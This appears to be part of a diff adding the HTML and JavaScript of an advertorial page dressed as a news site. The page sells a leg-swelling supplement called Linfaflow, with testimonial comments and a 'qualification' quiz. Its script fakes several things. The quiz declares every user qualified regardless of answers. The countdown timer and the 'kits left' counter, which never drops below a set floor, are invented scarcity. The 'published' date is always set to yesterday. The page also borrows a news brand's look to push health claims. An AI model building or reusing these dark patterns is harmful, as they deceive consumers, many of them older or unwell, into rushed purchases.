+<img loading="lazy" src="images/stephanie-clark-result.webp" decoding="async" class="comment-photo" data-src="images/stephanie-clark-result.webp" alt="Stephanie Clark's result photo" width="540" height="675" /><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>18</span>
+<span class="c-time">1 day ago</span></div></div></div><div class="comment">
+<img loading="lazy" decoding="async" class="comment-av" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' fill='%23e3e3e3'/%3E%3Ccircle cx='20' cy='16' r='7' fill='%23b3b3b3'/%3E%3Cpath d='M7 35c0-7.2 5.8-11 13-11s13 3.8 13 11z' fill='%23b3b3b3'/%3E%3C/svg%3E" alt="Charlotte Smith"><div class="comment-main">
+<span class="comment-name">Charlotte Smith</span><p class="comment-text">How quickly does the water drainage actually kick in?</p><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>6</span>
+<span class="c-time">2 days ago</span></div></div></div><div class="comment reply">
+<img loading="lazy" src="images/patricia-rivera.webp" decoding="async" class="comment-av" data-src="images/patricia-rivera.webp" alt="Patricia Rivera" width="217" height="232" /><div class="comment-main">
+<span class="comment-name">Patricia Rivera</span><p class="comment-text">Charlotte for me it only took 3 days! I had to go to the bathroom more often but the stiffness in my calves disappeared almost right away. Honestly shocked</p>
+<img loading="lazy" src="images/patricia-rivera-result.webp" decoding="async" class="comment-photo" data-src="images/patricia-rivera-result.webp" alt="Patricia Rivera's result photo" width="769" height="512" /><div class="comment-meta">
+<a href="#" class="c-link">Like</a><a href="#" class="c-link">Reply</a>
+<span class="c-likes"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M2 21h4V9H2v12zM23 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1z"/></svg>2</span>
+<span class="c-time">1 day ago</span></div></div></div></section></article></div><footer class="footer"><div class="footer-inner">
+<a class="footer-logo" href="#" aria-label="UNN"><span class="logo-text">UNN</span>
+</a><nav class="footer-nav">
+<a href="#">US</a><a href="#">World</a><a href="#">Politics</a><a href="#">Business</a>
+<a href="#">Health</a><a href="#">Entertainment</a><a href="#">Tech</a><a href="#">Style</a>
+<a href="#">Travel</a><a href="#">Sports</a><a href="#">Science</a><a href="#">Climate</a><a href="#">Weather</a></nav><div class="footer-legal">
+<a href="https://cc.linfaflow.com/dtcnew/lgl/terms-of-service.php" target="_blank" rel="noopener">Terms of Use</a><a href="https://cc.linfaflow.com/dtcnew/lgl/privacy-policy.php" target="_blank" rel="noopener">Privacy Policy</a>
+<a href="https://cc.linfaflow.com/dtcnew/lgl/refund-policy.php" target="_blank" rel="noopener">Refund Policy</a><a href="https://cc.linfaflow.com/dtcnew/lgl/contact-us.php" target="_blank" rel="noopener">Support</a></div></div></footer></div><style id="qualify-page-css">/*QUALIFY_PAGE_V1*/
+  .qq{padding:22px 22px 26px;text-align:center;}
+  .qq-badge{display:inline-flex;align-items:center;gap:6px;background:#e9f6ef;color:#137a42;
+    border:1px solid #c7e7d6;font-size:10.5px;font-weight:800;letter-spacing:.13em;
+    text-transform:uppercase;padding:6px 12px;border-radius:99px;margin:0 0 13px;}
+  .qq-badge svg{flex-shrink:0;}
+  .qq-h{font-size:27px;line-height:1.08;font-weight:800;letter-spacing:-.022em;color:var(--ink);
+    margin:0 0 9px;text-transform:uppercase;}
+  .qq-h span{color:var(--cnn-red);}
+  .qq-sub{font-size:14px;line-height:1.5;color:var(--body);margin:0 0 16px;}
+  .qq-sub b{color:var(--ink);font-weight:800;}
+
+  /* ---- 1. urgencia: timer ---- */
+  .qq-timer{display:flex;flex-direction:column;align-items:center;gap:1px;background:#fff5f5;
+    border:1px solid #f2d0d0;border-radius:6px;padding:11px 12px 13px;margin:0 0 15px;}
+  .qq-timer-lbl{font-size:10.5px;font-weight:800;letter-spacing:.12em;text-transform:uppercase;
+    color:var(--cnn-red);}
+  .qq-clock{font-size:36px;line-height:1.05;font-weight:800;letter-spacing:.01em;color:var(--ink);
+    font-variant-numeric:tabular-nums;font-feature-settings:"tnum";}
+  .qq-timer-foot{font-size:11.5px;line-height:1.4;color:var(--body);opacity:.8;margin-top:3px;}
+  .qq-timer.out{background:#fdecec;border-color:#e9b7b7;}
+  .qq-timer.out .qq-clock{color:var(--cnn-red);}
+
+  /* ---- oferta ---- */
+  .qq-offer{display:flex;align-items:center;justify-content:center;gap:22px;text-align:left;border:1px solid #ececea;
+    border-radius:6px;padding:12px 34px;margin:0 0 14px;background:#fff;}
+  .qq-offer-img{flex-shrink:0;width:90px;height:140px;display:flex;align-items:center;
+    justify-content:center;}
+  .qq-offer-img img{max-width:100%;max-height:100%;display:block;}
+  .qq-offer-info{flex:1;min-width:0;}
+  .qq-offer-name{font-size:15px;font-weight:800;color:var(--ink);line-height:1.2;}
+  .qq-offer-meta{font-size:12.5px;color:var(--body);margin-top:3px;line-height:1.45;}
+  .qq-offer-meta s{opacity:.65;}
+  .qq-offer-save{display:inline-block;background:#e9f6ef;color:#137a42;font-size:11px;
+    font-weight:800;padding:2px 7px;border-radius:99px;margin-top:5px;}
+  .qq-offer-price{flex-shrink:0;text-align:right;}
+  .qq-offer-price .qq-cur{font-size:19px;font-weight:800;color:var(--ink);vertical-align:top;
+    line-height:1.9;}
+  .qq-offer-price .qq-num{font-size:42px;font-weight:800;color:var(--ink);letter-spacing:-.02em;}
+  .qq-offer-price .qq-suffix{display:block;font-size:11px;color:var(--body);margin-top:-2px;}
+
+  /* ---- 2. escassez: estoque ---- */
+  .qq-stock{border:1px solid #ececea;border-radius:6px;padding:12px 13px;margin:0 0 14px;
+    text-align:left;background:#fafafa;}
+  .qq-stock-top{display:flex;align-items:baseline;justify-content:space-between;gap:10px;
+    font-size:13px;color:var(--body);line-height:1.35;}
+  .qq-stock-top b{color:var(--cnn-red);font-weight:800;font-size:14px;}
+  .qq-stock-bar{height:7px;background:#e7e7e5;border-radius:99px;overflow:hidden;margin:8px 0 6px;}
+  .qq-stock-bar i{display:block;height:100%;width:0;border-radius:99px;
+    background:linear-gradient(90deg,#e05a00,var(--cnn-red));transition:width .5s ease;}
+  .qq-stock-foot{font-size:11.5px;color:var(--body);opacity:.85;line-height:1.4;}
+
+  /* ---- 3. future pacing ---- */
+  .qq-delivery{display:flex;align-items:center;justify-content:center;gap:8px;text-align:center;
+    font-size:13.5px;line-height:1.4;color:var(--body);background:#f6f6f5;border-radius:6px;
+    padding:12px;margin:0 0 15px;}
+  .qq-delivery b{color:var(--ink);font-weight:800;}
+  .qq-delivery svg{flex-shrink:0;color:var(--ink);}
+
+  /* ---- 4. CTA ---- */
+  .qq-cta{margin:0;}
+  .qq-cta-sub{font-size:11.5px;color:var(--body);opacity:.85;margin:9px 0 0;line-height:1.45;}
+
+  @media (max-width:400px){
+    .qq{padding:18px 15px 22px;}
+    .qq-h{font-size:23px;}
+    .qq-clock{font-size:32px;}
+    .qq-offer{gap:16px;padding:10px 20px;}
+    .qq-offer-img{width:90px;height:140px;}
+    .qq-offer-price .qq-num{font-size:34px;}.qq-cur{font-size:16px;}
+  }
+  @media (prefers-reduced-motion:reduce){
+    .qq-stock-bar i{transition:none;}
+  }
+</style>
+<div class="sticky-cta-bar" id="stickyCta" aria-hidden="true">
+<a class="glance-cta sticky-cta" href="https://cc.linfaflow.com/dtcnew/checkout.php">GET MY 70% OFF <span class="arw" aria-hidden="true"><svg viewBox="0 0 24 24" width="20" height="20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path></svg></span></a></div><div class="q-overlay" id="quizOverlay" role="dialog" aria-modal="true" aria-label="Linfaflow qualification quiz"><div class="q-modal"><div class="q-top"><div class="q-progress"><i id="qBar"></i></div>
+<button class="q-close" id="qClose" aria-label="Close">&times;</button></div><div id="qBody"></div></div></div> <script>(function(){var QUESTIONS=[{q:"Where is your swelling?",opts:["Feet","Feet and ankles","Feet, ankles and legs"]},{q:"When is your swelling worst?",opts:["End of the day","After standing or sitting","All day, never lets up"]},{q:"Which symptoms do you have?",multi:!0,opts:["Sock marks","Heavy legs","Tight legs","Aching"]},{q:"How long have you had it?",opts:["Under 6 months","6 months to 2 years","2 to 5 years","Over 5 years"]},{q:"What have you tried for it?",opts:["Compression socks","Water pills","Legs up","Nothing yet"]},{q:"How old are you?",opts:["Under 45","45 to 54","55 to 64","65+"]}];var PACKS=[{name:"1 Bottle",badge:"40% OFF",free:!1,ship:"+ $9.95 Shipping",per:"$59",suffix:"",was:"$99",now:"$59",href:"https://cc.linfaflow.com/dtcnew/checkout.php",img:"images/mockup-kit-dev-1.webp"},{name:"2 Bottles",badge:"60% OFF",free:!0,per:"$39",suffix:"each",was:"$198",now:"$79",href:"https://cc.linfaflow.com/dtcnew/checkout.php",img:"images/mockup-kit-dev-2.webp"},{name:"3 Bottles",badge:"70% OFF",free:!0,per:"$29",suffix:"each",was:"$297",now:"$89",href:"https://cc.linfaflow.com/dtcnew/checkout.php",img:"images/mockup-kit-dev-3.webp"}];var DEFAULT_PACK=2;var DELIVERY_DAYS=3;var overlay=document.getElementById('quizOverlay');var body=document.getElementById('qBody');var bar=document.getElementById('qBar');var qTop=document.querySelector('#quizOverlay .q-top');var answers=[],step=0,selPack=DEFAULT_PACK;var N=QUESTIONS.length;var lastMouse={x:-1,y:-1};document.addEventListener('mousemove',function(e){lastMouse.x=e.clientX;lastMouse.y=e.clientY},{passive:!0});function setBar(){var pct=(step<N)?Math.round(((step+0.5)/N)*100):100;bar.style.width=pct+'%'}
+var noHoverClear=null;function armNoHover(){overlay.classList.add('nohover');if(noHoverClear)document.removeEventListener('mousemove',noHoverClear);var ax=lastMouse.x,ay=lastMouse.y;noHoverClear=function(e){if(ax<0||Math.abs(e.clientX-ax)>2||Math.abs(e.clientY-ay)>2){overlay.classList.remove('nohover');document.removeEventListener('mousemove',noHoverClear);noHoverClear=null}};document.addEventListener('mousemove',noHoverClear)}
+function openQuiz(e){if(e)e.preventDefault();answers=[];step=0;selPack=DEFAULT_PACK;overlay.classList.add('open');document.body.style.overflow='hidden';render();try{if(window.fbq)fbq('trackCustom','QuizStart');}catch(_){}}
+function closeQuiz(){overlay.classList.remove('open');document.body.style.overflow=''}
+function choose(i){answers[step]=i;step++;(step<N)?render():renderLoader()}
+function back(){if(step>0){step--;render()}}
+function toggleMulti(i,btn){var arr=answers[step]||(answers[step]=[]);var idx=arr.indexOf(i);if(idx>-1){arr.splice(idx,1);btn.classList.remove('sel')}else{arr.push(i);btn.classList.add('sel')}}
+function advanceMulti(){if(!answers[step])answers[step]=[];step++;(step<N)?render():renderLoader()}
+function render(){setBar();if(qTop)qTop.style.display='';var Q=QUESTIONS[step],html='<div class="q-step">';if(step===0){html+='<p class="q-brand">See if you qualify for 70% off</p>'}else{html+='<p class="q-kicker">Question '+(step+1)+' of '+N+'</p>'}
+html+='<h2 class="q-question">'+Q.q+'</h2>';if(Q.multi)html+='<p class="q-hint">Select all that apply</p>';html+='<div class="q-opts">';var msel=Q.multi?(answers[step]||[]):null;var isLastQuestion=(step===N-1);Q.opts.forEach(function(o,i){var on=Q.multi&&msel.indexOf(i)>-1;html+='<button'+(isLastQuestion?' id="ViewContent"':'')+' class="q-opt'+(Q.multi?' q-check':'')+(on?' sel':'')+'" data-i="'+i+'">'+o+'</button>'});html+='</div>';if(Q.multi)html+='<button class="q-continue" id="qCont">Continue<span class="arw" aria-hidden="true">&rarr;</span></button>';if(step>0)html+='<button class="q-back" id="qBack">&larr; Back</button>';html+='</div>';body.innerHTML=html;if(Q.multi){body.querySelectorAll('.q-opt').forEach(function(b){b.addEventListener('click',function(){toggleMulti(+b.getAttribute('data-i'),b)})});document.getElementById('qCont').addEventListener('click',advanceMulti)}else{body.querySelectorAll('.q-opt').forEach(function(b){b.addEventListener('click',function(){choose(+b.getAttribute('data-i'))})})}
+var bk=document.getElementById('qBack');if(bk)bk.addEventListener('click',back);armNoHover()}
+function renderLoader(){step=N;setBar();body.innerHTML='<div class="q-load"><div class="q-spinner"></div><p>Calculating your results&hellip;</p><small>Checking whether Linfaflow is a match for you</small></div>';var wait=window.matchMedia('(prefers-reduced-motion: reduce)').matches?300:2200;setTimeout(renderResult,wait)}
+function deliveryDate(){var d=new Date();d.setDate(d.getDate()+DELIVERY_DAYS);return d.toLocaleDateString('en-US',{month:'long',day:'numeric'})}
+/*QUALIFY_PAGE_V1 - tela final: pagina de qualificacao */
+var QUALIFY={
+  product:'Linfaflow',      /* nome exibido em "YOU QUALIFY FOR ..." */
+  pack:0,                   /* indice em PACKS: 0=1 frasco (nome + imagem + href vem daqui) */
+  offerPrice:'$19.99',      /* preco mostrado no cartao da oferta */
+  discount:'70% OFF',       /* alinhado com o resto da pagina e com o CTA */
+  timerMinutes:10,          /* urgencia: minutos do contador regressivo */
+  stockStart:9,             /* escassez: kits restantes exibidos ao abrir a tela */
+  stockFloor:3,             /* piso: o contador nunca desce abaixo disso */
+  stockTotal:40,            /* lote do dia, usado so para calcular a % da barra */
+  stockTickSeconds:37,      /* de quantos em quantos segundos cai 1 kit */
+  ctaText:'GET MY 70% DISCOUNT NOW'
+};
+var qqTimerInt=null,qqStockInt=null,qqStock=0;
+function qqPad(n){return(n<10?'0':'')+n}
+function qqAlive(id){return document.getElementById(id)}
+function qqDeliveryDate(){var d=new Date();d.setDate(d.getDate()+DELIVERY_DAYS);
+  return d.toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric'})}
+function qqNum(v){var n=parseFloat(String(v).replace(/[^0-9.]/g,''));return isNaN(n)?0:n}
+function qqStockPct(){var pct=Math.round((1-(qqStock/QUALIFY.stockTotal))*100);
+  return Math.max(0,Math.min(99,pct))}
+function qqPaintStock(){var el=qqAlive('qqStock'),bar=qqAlive('qqBar2'),pc=qqAlive('qqPct');
+  if(!el){if(qqStockInt){clearInterval(qqStockInt);qqStockInt=null}return}
+  el.textContent=qqStock;if(bar)bar.style.width=qqStockPct()+'%';
+  if(pc)pc.textContent=qqStockPct()+'%'}
+function qqStartStock(){if(qqStockInt)clearInterval(qqStockInt);
+  qqStock=QUALIFY.stockStart;qqPaintStock();
+  qqStockInt=setInterval(function(){
+    if(!qqAlive('qqStock')){clearInterval(qqStockInt);qqStockInt=null;return}
+    if(qqStock>QUALIFY.stockFloor){qqStock--;qqPaintStock()}
+  },QUALIFY.stockTickSeconds*1000)}
+function qqStartTimer(){if(qqTimerInt)clearInterval(qqTimerInt);
+  var left=QUALIFY.timerMinutes*60;
+  function paint(){var el=qqAlive('qqClock');
+    if(!el){clearInterval(qqTimerInt);qqTimerInt=null;return}
+    el.textContent=qqPad(Math.floor(left/60))+':'+qqPad(left%60);
+    if(left<=0){clearInterval(qqTimerInt);qqTimerInt=null;
+      var box=qqAlive('qqTimer');if(box)box.classList.add('out');
+      var lbl=qqAlive('qqTimerLbl');if(lbl)lbl.textContent='Your discount is expiring';
+      var ft=qqAlive('qqTimerFoot');if(ft)ft.textContent='Check out now before it is released to the next person in line.';
+      return}
+    left--}
+  paint();qqTimerInt=setInterval(paint,1000)}
+function renderResult(){step=N+1;setBar();if(qTop)qTop.style.display='none';
+try{if(window.fbq)fbq('track','Lead');}catch(_){}
+if(qqTimerInt){clearInterval(qqTimerInt);qqTimerInt=null}
+if(qqStockInt){clearInterval(qqStockInt);qqStockInt=null}
+selPack=QUALIFY.pack;var p=PACKS[selPack];
+var html='<div class="q-step qq">';
+/* --- 1. YOU QUALIFY FOR [PRODUTO] --- */
+html+='<div class="qq-badge">'
+  +'<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'
+  +'You qualify</div>';
+html+='<h2 class="qq-h">You qualify for <span>'+QUALIFY.product+'</span></h2>';
+html+='<p class="qq-sub">Based on your answers, you are a match for the <b>'+p.name+'</b> protocol at <b>'+QUALIFY.discount+'</b>.</p>';
+/* --- 2. urgencia: timer --- */
+html+='<div class="qq-timer" id="qqTimer">'
+  +'<span class="qq-timer-lbl" id="qqTimerLbl">Your '+QUALIFY.discount+' is reserved for</span>'
+  +'<span class="qq-clock" id="qqClock">'+qqPad(QUALIFY.timerMinutes)+':00</span>'
+  +'<span class="qq-timer-foot" id="qqTimerFoot">After that your spot is released to the next person in line.</span>'
+  +'</div>';
+/* --- oferta --- */
+var opm=/^(\D*)(.*)$/.exec(QUALIFY.offerPrice),opcur=opm[1],opnum=opm[2];
+html+='<div class="qq-offer">'
+  +'<div class="qq-offer-img"><img loading="lazy" decoding="async" src="'+p.img+'" alt="'+p.name+'"></div>'
+  +'<div class="qq-offer-price"><span class="qq-cur">'+opcur+'</span>'
+    +'<span class="qq-num">'+opnum+'</span></div>'
+  +'</div>';
+/* --- 3. escassez: estoque --- */
+html+='<div class="qq-stock">'
+  +'<div class="qq-stock-top"><span>Kits left at this price</span>'
+  +'<span><b id="qqStock">'+QUALIFY.stockStart+'</b> left</span></div>'
+  +'<div class="qq-stock-bar"><i id="qqBar2"></i></div>'
+  +'<div class="qq-stock-foot"><b id="qqPct">0%</b> of today&rsquo;s stock has already been claimed.</div>'
+  +'</div>';
+/* --- 4. future pacing: quando chega --- */
+html+='<p class="qq-delivery">'
+  +'<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="1" y="3" width="15" height="13"/><polygon points="16 8 20 8 23 11 23 16 16 16 16 8"/><circle cx="5.5" cy="18.5" r="2.5"/><circle cx="18.5" cy="18.5" r="2.5"/></svg>'
+  +'<span>Order now and it arrives by <b>'+qqDeliveryDate()+'</b></span></p>';
+/* --- 5. CTA --- */
+html+='<button class="q-final-cta qq-cta" id="qGo"><span id="qGoTxt">'+QUALIFY.ctaText+'</span><span class="arw" aria-hidden="true">&rarr;</span></button>';
+html+='<p class="qq-cta-sub">Secure checkout &middot; Ships today &middot; Cancel anytime</p>';
+/* --- 6. garantia --- */
+html+='<p class="q-guarantee">'
+  +'<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>'
+  +'<span><b>100% money-back guarantee.</b><br>If you&rsquo;re not satisfied for any reason, you&rsquo;ll receive a full refund. No questions asked.</span></p>';
+html+='</div>';
+body.innerHTML=html;
+document.getElementById('qGo').addEventListener('click',function(){goCheckout(p.href)});
+qqStartTimer();qqStartStock();armNoHover()}
+function withParams(url){var qs=window.location.search.replace(/^\?/,'');return qs?url+(url.indexOf('?')>-1?'&':'?')+qs:url}
+function goCheckout(url){try{if(window.fbq)fbq('track','InitiateCheckout');}catch(_){}
+try{if(window.utmify&&window.utmify.track)window.utmify.track('InitiateCheckout');}catch(_){}
+window.location.href=withParams(url)}
+document.querySelectorAll('.glance-cta, .cta-btn').forEach(function(b){b.id='DTC_CTA';b.addEventListener('click',openQuiz)});document.getElementById('qClose').addEventListener('click',closeQuiz);overlay.addEventListener('click',function(e){if(e.target===overlay)closeQuiz();});document.addEventListener('keydown',function(e){if(e.key==='Escape'&&overlay.classList.contains('open'))closeQuiz();})})()</script> <script>(function(){var menu=document.getElementById('mobileMenu');var btns=document.querySelectorAll('.js-menu');function setExpanded(v){btns.forEach(function(b){b.classList.toggle('open',v);b.setAttribute('aria-expanded',v?'true':'false')})}
+function open(){menu.classList.add('open');setExpanded(!0);document.body.style.overflow='hidden'}
+function close(){menu.classList.remove('open');setExpanded(!1);document.body.style.overflow=''}
+btns.forEach(function(b){b.addEventListener('click',function(){menu.classList.contains('open')?close():open()})});menu.querySelectorAll('[data-close]').forEach(function(el){el.addEventListener('click',close)});menu.querySelectorAll('.drawer li').forEach(function(el){el.addEventListener('click',close)});document.addEventListener('keydown',function(e){if(e.key==='Escape'&&menu.classList.contains('open'))close();})})();(function(){var bar=document.getElementById('scrollProgress');if(!bar)return;var ticking=!1;function update(){var doc=document.documentElement;var max=doc.scrollHeight-window.innerHeight;var p=max>0?Math.min(1,Math.max(0,(window.scrollY||doc.scrollTop)/max)):0;var eased=Math.pow(p,0.55);bar.style.transform='scaleX('+eased+')';ticking=!1}
+window.addEventListener('scroll',function(){if(!ticking){window.requestAnimationFrame(update);ticking=!0}},{passive:!0});window.addEventListener('resize',update,{passive:!0});update()})();var DAYS_FULL=['Sunday','Monday','Tuesday','Wednesday','Thursday','Friday','Saturday'];var DAYS_ABBR=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];var MONTHS=['January','February','March','April','May','June','July','August','September','October','November','December'];(function(){var el=document.getElementById('pub-date');if(!el)return;var d=new Date();d.setDate(d.getDate()-1);el.textContent='Published '+DAYS_ABBR[d.getDay()]+' '+MONTHS[d.getMonth()]+' '+d.getDate()+', '+d.getFullYear()})();(function(){var els=document.querySelectorAll('.js-deadline');if(!els.length)return;var d=new Date();var txt=DAYS_FULL[d.getDay()]+', '+MONTHS[d.getMonth()]+' '+d.getDate();els.forEach(function(el){el.textContent=txt})})()</script>  <script>(function(){var bar=document.getElementById('stickyCta');if(!bar||!('IntersectionObserver' in window))return;var ctas=document.querySelectorAll('.article-col .glance-cta');if(!ctas.length)return;var armed=!1;var visible=new Set();function update(){if(armed&&visible.size===0)bar.classList.add('show');else bar.classList.remove('show')}
+var io=new IntersectionObserver(function(entries){entries.forEach(function(e){if(e.isIntersecting){armed=!0;visible.add(e.target)}else visible.delete(e.target)});update()},{threshold:0});ctas.forEach(function(c){io.observe(c)})})()</script>
+<script id="lf-no-jump">
+document.addEventListener('click', function(e){
+  var a = e.target.closest && e.target.closest('a[href="#"]');
+  if (a) e.preventDefault();
+}, false);
+</script></body></html>
